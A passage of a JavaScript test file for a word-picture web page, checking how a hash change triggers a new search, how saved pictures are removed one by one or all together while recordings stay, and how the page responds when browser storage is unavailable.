    expect(view.shown('results')).toBe(false);
    // The word in the address changes while the page is open.
    view.window.location.hash = '#word=sun';
    view.window.dispatchEvent(new view.window.Event('hashchange'));
    expect(view.$('word').value).toBe('sun');
    await view.searched();
    expect(view.$('results-title').textContent).toBe('Pictures for the word sun');
    expect(view.calls.length).toBe(6);
    expect(view.calls.slice(3).every((call) => /[=]sun(&|%20)/.test(call.address) && !call.address.includes('cat'))).toBe(true);
  });

  it('"My pictures": each saved picture with its credit, Remove takes one, Remove all asks first, and a recording is never touched', async () => {
    const idb = fakeIndexedDB();
    const seed = myWords.create({ indexedDB: idb });
    await seed.put('cat', { picture: { dataUri: png(700), credit: CREDIT }, clip: { dataUri: wav(900), source: 'teacher', ms: 400 } });
    await seed.put('sun', { picture: { dataUri: jpeg(800), credit: { own: true } } });
    await seed.put('ship', { picture: { dataUri: png(500), credit: { title: 'Ship', author: 'Lee', license: 'CC0' } }, sounds: ['sh', 'i', 'p'] });
    await seed.put('dog', { sounds: ['d', 'o', 'g'] });      // no picture: not listed
    const view = await openPage({ idb });
    await until(() => view.$('mine-list').children.length === 3, 'my pictures was drawn');
    expect([...view.$('mine-list').querySelectorAll('.mine-word')].map((node) => node.textContent)).toEqual(['cat', 'ship', 'sun']);
    expect([...view.$('mine-list').querySelectorAll('.mine-credit')].map((node) => node.textContent)).toEqual([myWords.creditLine(CREDIT), '"Ship" by Lee, CC0.', "The teacher's own picture."]);
    expect([...view.$('mine-list').querySelectorAll('img')].map((image) => image.src)).toEqual([png(700), png(500), jpeg(800)]);
    expect(view.$('mine-line').textContent).toBe('3 words have a picture. They are kept in this browser, on this device.');
    expect(view.shown('remove-all')).toBe(true);
    expect(view.calls).toEqual([]);
    // Remove one: the picture goes, the recording for that word stays, and focus moves to the next row.
    view.$('mine-list').querySelector('button[data-word="cat"]').click();
    await until(() => view.$('mine-list').children.length === 2, 'one was removed');
    await until(() => view.said() === 'Removed the picture for cat.', 'it was said');
    expect(Object.keys(await view.store.get('cat')).sort()).toEqual(['clip', 'updated', 'word']);
    expect(view.doc.activeElement.getAttribute('data-word')).toBe('ship');
    // Remove all asks first.
    view.$('remove-all').click();
    expect(view.shown('remove-all-ask')).toBe(true);
    expect(view.$('remove-all-line').textContent).toBe('Remove every picture from this device? Recordings are not touched.');
    expect(view.doc.activeElement).toBe(view.$('remove-all-yes'));
    view.$('remove-all-no').click();
    expect(view.shown('remove-all-ask')).toBe(false);
    expect(view.$('mine-list').children.length).toBe(2);
    view.$('remove-all').click();
    view.$('remove-all-yes').click();
    await until(() => view.said() === 'Removed 2 pictures.', 'all were removed');
    expect(view.$('mine-list').children.length).toBe(0);
    expect(view.$('mine-line').textContent).toBe('No pictures yet.');
    expect(view.shown('remove-all')).toBe(false);
    expect(view.doc.activeElement).toBe(view.$('mine-title'));
    // What was not a picture is still there.
    expect((await view.store.list()).map((row) => [row.word, row.sounds, row.clip, row.picture])).toEqual([['cat', false, true, false], ['dog', true, false, false], ['ship', true, false, false]]);
    expect(view.calls).toEqual([]);
  });

  it('when the browser is not keeping words, the page says so and offers nothing it cannot do', async () => {
    const view = await openPage({ hash: '#word=cat', idb: null });
    await until(() => view.shown('not-keeping'), 'the note was shown');
    expect(view.$('not-keeping').textContent).toBe('This browser is not keeping your words. A picture you choose here cannot be saved. This can happen in a private window, or when site data is blocked.');
    expect(view.$('not-keeping').querySelector('strong').textContent).toBe(myWords.NOT_KEEPING);
    for (const id of ['device', 'online', 'mine']) expect(view.shown(id), id).toBe(false);
    expect(view.calls).toEqual([]);
  });
});
